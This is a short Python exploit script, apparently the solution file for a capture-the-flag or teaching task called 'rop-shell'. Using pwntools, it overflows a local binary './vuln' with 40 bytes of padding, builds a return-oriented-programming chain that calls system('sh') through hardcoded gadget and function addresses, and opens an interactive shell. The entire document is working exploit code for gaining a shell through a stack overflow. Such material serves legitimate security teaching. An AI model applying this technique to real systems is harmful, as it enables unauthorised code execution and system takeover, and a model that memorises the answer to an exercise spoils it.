#!/usr/bin/env python

"""
Solution (exploit) for rop-shell task.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call system("/bin/sh").
"""

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

io = process("./vuln")
elf = ELF('./vuln')
rop = ROP(elf)

# Fill required addresses.
offset = 40
pop_rdi_ret_address = 0x401273
system_address = 0x4011a3
sh_address = next(elf.search(b'sh\0'))

rop.call(system_address, [sh_address])

# Craft payload.
# payload = offset * b'A' + p64(pop_rdi_ret_address) + p64(sh_address) + \
# 	p64(system_address)
payload = offset * b'a' + rop.chain()

msg = io.recvuntil(b': ')
io.sendline(payload)

io.interactive()
